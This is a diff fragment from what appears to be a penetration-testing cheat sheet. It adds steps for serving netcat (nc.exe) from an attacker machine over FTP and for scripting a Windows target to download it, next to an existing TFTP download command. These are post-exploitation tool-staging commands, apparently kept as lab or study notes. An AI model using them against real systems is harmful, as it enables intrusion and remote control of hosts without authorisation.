@@ -301,6 +301,17 @@ $ cp /usr/share/windows-binaries/nc.exe /tftp/
 # tftp: download nc.exe to target machine
 cmd> tftp -i 10.11.0.63 get nc.exe
 cmd> "Transfer successful: 59392 bytes in 31 seconds."
+
+# (KALI) ftp - start FTP server
+$ python -m pyftpdlib -p 21
+# (TARGET) ftp - connect to server, get file
+$ echo open 10.10.15.39 21> ftp.txt
+$ echo USER anonymous>> ftp.txt
+$ echo PASS anonymous@>> ftp.txt
+$ echo bin>> ftp.txt
+$ echo GET nc.exe>> ftp.txt
+$ echo bye>> ftp.txt
+$ ftp -v -n -s:ftp.txt
 ```
 
 Vulnerable services:
